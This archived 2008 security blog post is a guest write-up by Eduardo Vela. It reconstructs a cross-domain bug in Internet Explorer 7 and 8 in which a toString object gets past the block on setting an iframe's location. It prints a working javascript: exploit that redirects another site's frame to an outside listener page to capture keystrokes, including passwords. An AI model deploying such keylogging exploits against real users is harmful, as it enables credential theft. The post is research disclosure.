<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Ghost Busters</title><meta name="description" content="&gt; A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:"><meta property="name" content="Ghost Busters"><meta itemprop="name" content="Ghost Busters"><meta property="description" content="&gt; A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:"><meta itemprop="description" content="&gt; A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:"><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fghost-busters%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fghost-busters%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/ghost-busters/"><meta property="og:title" content="Ghost Busters"><meta property="og:description" content="&gt; A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:"><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fghost-busters%2F?w=1024"><meta name="twitter:title" content="Ghost Busters"><meta name="twitter:description" content="&gt; A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fghost-busters%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Ghost Busters</h1><div class="date">Thu, 15 May 2008 16:26:48 GMT</div><div class="author">by
<a href="/members/pdp.html">pdp</a></div><div id="post-content"><blockquote>
<p>A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:</p>
</blockquote>
<p>There a few conferences that are privately held (invite-only) and their level is commonly very high. One of them is Microsoft&#39;s BlueHat conference. BlueHat is an &quot;internal Microsoft event&quot;, but they invite a lot of security researchers from around the world. A couple of friends presented in there, and well, apparently it was really fun. Anyway, there was a specific talk that caught our attention, more specifically Manuel Caballero&#39;s &quot;A resident in my domain&quot;. The description of his talk was really intriguing:</p>
<blockquote>
<p>Do you believe in ghosts? Imagine an invisible script that silently follows you while you surf, even after changing the URL 1,000 times and you are feeling completely safe. Now imagine that the ghost is able to see everything you do, including what you are surfing and what you are typing (passwords included), and even guess your next move.
No downloading required, no user confirmation, no ActiveX. In other words: no strings attached. We will examine the power of a resident script and the power of a global cross-domain. Also, we will go through the steps of how to find cross-domains and resident scripts.</p>
</blockquote>
<p>Apparently, Caballero found a way of capturing keystrokes and window&#39;s location. This means that he &quot;at least&quot; has access to modify <code>document.onkeydown</code>, and read <code>window.location</code>, but if he could modify <code>document.onkeydown</code>, that would mean he has access to execute arbitrary code on other&#39;s domains context, so that&#39;s not it.. because if that was the case, he wouldn&#39;t be able to just capture keystrokes, but to UXSS (Universal XSS) the browser.</p>
<p>Anyway, the two things he claims to be able to manipulate can also be manipulated from an off-domain <code>iframe</code>. So if there&#39;s some way of changing the location of an <code>iframe</code>, to any <code>iframe</code> we want, then we would be able to capture keystrokes on our own window. So, we now need a way of changing the location of an <code>iframe</code>, but first we need to get a reference to the window where the <code>iframe</code>s stay, without loosing the script run-time execution. So there are 2 main ways of getting a reference to a window:</p>
<pre><code class="language-javascript">x=open().window
x=<span class="built_in">window</span>.opener</code></pre>
<p>Both require the user to open a new window and they work exactly the same way. So if you manage to make the user open a new window, then it doesn&#39;t matter where the user is navigating to, (if both windows remains open, anyway if the users close them, you can reopen&amp;blur) you have them. So how do we do that? We need to get a reference to the <code>iframe</code>s. The ways of doing so are:</p>
<pre><code class="language-javascript"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"iframe"</span>) {doesnt work on cross-domain calls}
<span class="built_in">window</span>.frames[] {works on cross-domain calls}</code></pre>
<p>Now we just need to modify the location. This is trivial, just changing <code>window.opener.frames[0].location=&quot;new location&quot;</code> shold work. On a recent versions of IE7 and IE8 this method doesn&#39;t work. When you try this, the browser will open a new window and by doing so, not modifying the location of the <code>iframe</code>.</p>
<p>After doing some tests, the location DOES gets changed when the setted location is not a string. We have hte following options:</p>
<pre><code class="language-javascript"><span class="built_in">window</span>.opener.frames[<span class="number">0</span>].location=<span class="number">123</span>;
<span class="built_in">window</span>.opener.frames[<span class="number">0</span>].location=<span class="built_in">window</span>;
<span class="built_in">window</span>.opener.frames[<span class="number">0</span>].location=location;</code></pre>
<p>Works fine! But why? Well, apparently IE7&amp;8 have a protection against setting locations by off-domain scripts, and this protection is.. &quot;if the setted location is a string, throw an Error&quot;. Not good! We have a lot of ways of making a <code>String</code> to look like an <code>Object</code>. For example.</p>
<pre><code class="language-javascript"><span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"some-string"</span>);
{<span class="attr">toString</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{<span class="keyword">return</span> <span class="string">"some-string"</span>;}}
<span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{<span class="keyword">this</span>.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{<span class="keyword">return</span> <span class="string">"some-string"</span>;}}</code></pre>
<p>This way, we bypass IE&#39;s protection and set our desired location without any problems. And the final exploit goes like this:</p>
<pre><code class="language-javascript">javascript:x=open(<span class="string">'http://hackademix.net/'</span>);setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{<span class="keyword">try</span>{x.frames[<span class="number">0</span>].location={<span class="attr">toString</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{<span class="keyword">return</span> <span class="string">'http://www.sirdarckcat.net/caballero-listener.html'</span>;}}}<span class="keyword">catch</span>(e){}},<span class="number">5000</span>);<span class="keyword">void</span>(<span class="number">1</span>);</code></pre>
<p>What caballero-listener does is just focusing itself, so it can catches <code>onkeydown</code> events.. there are a lot of ways of making the same thing in more stealth mode.</p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1be0cc81b33722a9bb3dd64ab7011461?s=256&amp;d=retro" alt="Rewind"><span class="post-comment-author">Rewind</span><div class="post-comment-content">I have thought about something of the kind (using onkeydown). My idea was to create a page which set web browser fullscreen, for hiding the real address bar, and remake it with an input balise. After that, you can control what you want, can't you ?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/9bac8baa8ae20d56ec0320a2f2c33c82?s=256&amp;d=retro" alt="fazed"><span class="post-comment-author">fazed</span><div class="post-comment-content">nice work :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f562ffe3ce026981f54a75d0364328b3?s=256&amp;d=retro" alt="echoHI"><span class="post-comment-author">echoHI</span><div class="post-comment-content">cool:) I will try to do the further work.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/3279b01e2d7bc17250897f4c3b47d27d?s=256&amp;d=retro" alt="fragge"><span class="post-comment-author">fragge</span><div class="post-comment-content">Excellent post Eduardo ;) keylogging script from a hyperlink! wow.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/89886495b27cfdc78593e1f5c8810594?s=256&amp;d=retro" alt=".mario"><span class="post-comment-author">.mario</span><div class="post-comment-content">Awesome research and very good writeup, SDC. I wouldn't have expected anything but quality from you anyway ;) 

Greetings, .mario</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/7ef2e1dc36f594a9599b3f46800d1226?s=256&amp;d=retro" alt="tilki"><span class="post-comment-author">tilki</span><div class="post-comment-content">hi.. good ... :)the turkhackteam...!!! tirtil...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e0f595cbc8f1811233adce10ac6c5d3?s=256&amp;d=retro" alt="Awesome AnDrEw"><span class="post-comment-author">Awesome AnDrEw</span><div class="post-comment-content">Although I did not use the open method I did come up with something quite similar months ago for an example, which was able to capture the keystrokes placed within an IFRAME element in order to then transmit them back through images in order to provide a basic web key-logger. I do believe I read about this presentation on some other website, but no proof of concept was attached at the time. Nice work.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">yes, excellent research and very interesting indeed. Will mention it tmrw at CONFidence.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a854707dca048e22d1bd1621262ad6b5?s=256&amp;d=retro" alt="Foobar"><span class="post-comment-author">Foobar</span><div class="post-comment-content">Yah,

Caballero's work is much greater than this. He can insert cross domain javascript etc...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/7cbc92539908016d963e676d90fd26fe?s=256&amp;d=retro" alt="Venom23"><span class="post-comment-author">Venom23</span><div class="post-comment-content">I found a PoC link. Perhaps some reader is interested. 

http://raffon.net/research/ms/ie/crossdomain/string.html#</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/de37b9dc788b0268d438591e085e4496?s=256&amp;d=retro" alt="sirdarckcat"><span class="post-comment-author">sirdarckcat</span><div class="post-comment-content">@Foobar:
&gt; Caballeroâ€™s work is much greater than this. He can insert cross domain javascript etcâ€¦

I dont think so.. but an interesting discovery, revealed that this one can also make stuff cross-domain ;)

http://www.ph4nt0m.org-a.googlepages.com/PSTZine_0x02_0x04.txt

So well.. yeah..</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/68007b4cbd4d6e476404dbfd36a37a1d?s=256&amp;d=retro" alt="Alok"><span class="post-comment-author">Alok</span><div class="post-comment-content">Nice wrk .. key loggers working with simple html pages.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2022 <a href=""></a>. All rights reserved.</p></footer></body></html>